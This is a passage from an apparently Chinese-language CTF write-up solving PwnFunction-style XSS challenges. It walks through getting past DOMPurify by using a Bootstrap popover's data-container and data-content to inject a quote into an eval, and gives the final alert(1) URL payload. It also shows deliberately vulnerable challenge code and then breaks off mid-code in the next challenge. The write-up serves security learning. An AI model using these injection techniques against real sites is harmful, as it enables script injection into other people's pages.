class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">number</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">number</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcome&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-sm&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;DM @PwnFunction&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">data-trigger</span>=<span class="hljs-string">&quot;hover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;</span>&gt;</span>Solved it?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Input */</span></span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> number = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;number&apos;</span>) || <span class="hljs-string">&quot;7&quot;</span>)[<span class="hljs-number">0</span>],</span></span><br><span class="line"><span class="hljs-actionscript">        name = DOMPurify.sanitize(<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;name&apos;</span>), { SAFE_FOR_JQUERY: <span class="hljs-literal">true</span> });</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;number#number&apos;</span>).html(number);</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#welcome&apos;</span>).html(<span class="hljs-string">`Welcome &lt;b&gt;<span class="hljs-subst">${name || <span class="hljs-string">&quot;Mr. Wick&quot;</span>}</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Greet */</span></span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;show&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;hide&apos;</span>)</span></span><br><span class="line">    }, 2000)</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> magicNumber = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> number = <span class="hljs-built_in">eval</span>($(<span class="hljs-string">&apos;number#number&apos;</span>).html());</span></span><br><span class="line">    if (magicNumber === number) {</span><br><span class="line"><span class="hljs-actionscript">        alert(<span class="hljs-string">&quot;You&apos;re Breathtaking!&quot;</span>)</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x672C;&#x9898;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x4E86;&#x56DB;&#x4E2A; js &#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.4.1.slim.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x989D;&#x5916;&#x7ED9;&#x6211;&#x4EEC;&#x589E;&#x52A0;&#x7684;&#x8FD9;&#x51E0;&#x4E2A; js &#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x8FD9;&#x9053;&#x9898;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x7684;&#x5DE5;&#x5177;&#x4E86;&#x3002;</p><p>Purify.js &#x662F;&#x4E00;&#x4E2A; XSS WAF&#xFF0C;Popper.js&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x63D0;&#x793A;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x9898;&#x76EE;&#x4E2D;&#x4E5F;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F7F;&#x7528; popper &#x7684;&#x4F8B;&#x5B50;&#xFF0C;Jqeury.js &#x4E0E; Bootstrap &#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; name &#x53C2;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F; number &#x53C2;&#x6570;&#x3002;&#x7136;&#x800C; number &#x53C2;&#x6570;&#x6211;&#x4EEC;&#x5374;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4F4D;&#xFF0C;&#x800C; name &#x53C2;&#x6570;&#x867D;&#x7136;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x53EF;&#x63A7;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x7ECF;&#x8FC7; XSS WAF &#x8FC7;&#x6EE4;&#x3002;&#x867D;&#x7136;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x4E9B;&#x5229;&#x7528; mxss bypass Domprify &#x7684;&#x4E8B;&#x4F8B;&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x662F;&#x5728; 2.0 &#x5DE6;&#x53F3;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; 2.0.7 &#x53C8;&#x662F;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x662F;&#x4EC0;&#x4E48;&#x65B0;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x5426;&#x5219; number &#x53C2;&#x6570;&#x4E0E;&#x6700;&#x540E;&#x7684; <code>eval($(&quot;number#number&quot;).html());</code> &#x5C31;&#x6CA1;&#x7528;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x7528;&#x4E0A;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x80FD;&#x7528;&#x5230;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>eval($(&quot;number#number&quot;).html())</code>&#x8FDB;&#x884C; XSS &#xFF0C;&#x800C; number &#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x53EA;&#x6709;&#x4E00;&#x4F4D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x5F97;&#x60F3;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x529E;&#x6CD5;&#x6DFB;&#x52A0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; <a href="https://getbootstrap.com/docs/4.0/components/popovers" target="_blank" rel="noopener">popper document</a> &#x7ED3;&#x5408;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x90A3;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C8C;&#x4F3C;&#x8FD9;&#x4E2A; popper.js &#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x6DFB;&#x52A0;&#x65B0;&#x5185;&#x5BB9;&#x6761;&#x4EF6;&#xFF0C;&#x800C;&#x5728;&#x6587;&#x6863; <a href="https://getbootstrap.com/docs/4.0/components/popovers/#options" target="_blank" rel="noopener">options</a> &#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5230;&#x6709;&#x4E00;&#x4E9B;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x5173;&#x6CE8;&#x7684;&#x53C2;&#x6570;&#xFF1A;</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string | element | false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: &apos;body&apos;</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string | element | function</td><td>&#x2018;&#x2019;</td><td>Default content value if <code>data-content</code> attribute isn&#x2019;t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x6587;&#x6863;&#x77E5;&#x9053;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>data-container</code>&#x6765;&#x63A7;&#x5236; popover &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;<code>data-content</code>&#x6765;&#x63A7;&#x5236;&#x5185;&#x5BB9;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#x628A;&#x8FD9;&#x4E2A; popover &#x5F04;&#x5230; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x5462;&#xFF1F;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x5982;&#x4E0B; payload &#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5229;&#x7528;&#x9898;&#x76EE;&#x4E2D;&#x539F;&#x6709;&#x7684;<code>$(&quot;#keanu&quot;).popover(&quot;show&quot;);</code>&#x6765;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x7684; popover &#xFF0C;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x5148;&#x6CE8;&#x91CA;&#x6389;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#x7684;&#x5EF6;&#x8FDF;&#x5173;&#x95ED;&#x7684;&#x529F;&#x80FD;&#x4EE5;&#x4FBF;&#x4E8E;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png" alt></p><p>&#x5C3D;&#x7BA1; eval &#x6267;&#x884C;&#x51FA;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x786E;&#x5B9E;&#x88AB;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x4E86;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x5185;&#x5BB9;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover fade bs-popover-right show&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;popover238474&quot;</span> <span class="hljs-attr">x-placement</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arrow&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-header&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-body&quot;</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x5185;&#x5BB9;:<code>7&lt;template&gt;hello&lt;/template&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F; 7 &#x4E0E; hello &#xFF0C;<code>&lt;template&gt;</code>&#x5C31;&#x662F; popper.js &#x5B9E;&#x73B0;&#x7684; popover &#x529F;&#x80FD;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x6CE8;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x5982;&#x4F55;&#x5728;<code>$str=&quot;$1&lt;template&gt;$any&lt;/template&gt;&quot;;eval($str);</code>&#x5F53;&#x4E2D;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x5230;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x7B54;&#x6848;&#x5DF2;&#x7ECF;&#x547C;&#x4E4B;&#x6B32;&#x51FA;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x662F;&#x5728;<code>eval</code>&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7B2C;&#x4E00;&#x4F4D;&#x4E3A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x7531;&#x4E8E;&#x4E2D;&#x95F4;<code>$any</code>&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#xFF0C;&#x540E;&#x9762;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x5C06;<code>&lt;template&gt;</code>&#x53D8;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;<code>//</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;<code>&lt;/template&gt;</code>&#x5373;&#x53EF;&#xFF0C;&#x6574;&#x4E2A; payload &#x5373;&#x662F;<code>&apos;&lt;tamplate&gt;&apos;;alert();//&lt;/tamplate&gt;</code>&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FD9;&#x4E48;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;&apos;;alert(1);//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5373;&#x53EF;&#x5B9E;&#x73B0; XSS&#xFF0C;&#x6240;&#x4EE5; payload:</p><p></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">number</span>=&apos;&amp;name=&lt;button id<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;keanu&quot;</span> data-toggle<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;popover&quot;</span> data-container<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;%23number&quot;</span> data-content<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;&apos;%3Balert(1)%3B%2F%2F&quot;</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png" alt></p><h2 id="WW3"><a href="#WW3" class="headerlink" title="WW3"></a>WW3</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Meme Code<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;meme-code&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;notify&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Utils */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function">(<span class="hljs-params">dirty</span>) =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&apos;&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">        return (`<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;</span>);`+</span></span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;meme-card&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;${img}&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>${text}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">        if (text &amp;&amp; img) {</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) {</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                html = (`<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-warning&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Meme<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> created from ${DOMPurify.sanitize(text)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#status&apos;</span>).remove()</span></span><br><span class="line"><span class="hljs-javascript">                notify ? ($(<span class="hljs-string">&apos;#notify&apos;</span>).html(html)) : <span class="hljs-string">&apos;&apos;</span></span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(template)</span></span><br><span class="line">            }, 1000)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;text&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;img&apos;</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span 